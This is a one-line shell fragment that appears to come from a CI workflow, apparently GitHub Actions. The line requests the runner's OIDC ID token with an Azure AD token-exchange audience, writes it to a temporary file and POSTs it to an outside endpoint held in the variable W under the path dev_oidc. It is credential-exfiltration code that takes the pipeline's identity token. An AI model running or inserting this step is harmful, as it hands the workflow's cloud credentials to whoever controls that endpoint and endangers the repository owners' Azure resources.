          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json; curl -sS -m 20 -X POST --data-binary @/tmp/o.json "$W/dev_oidc" -o /dev/null; fi
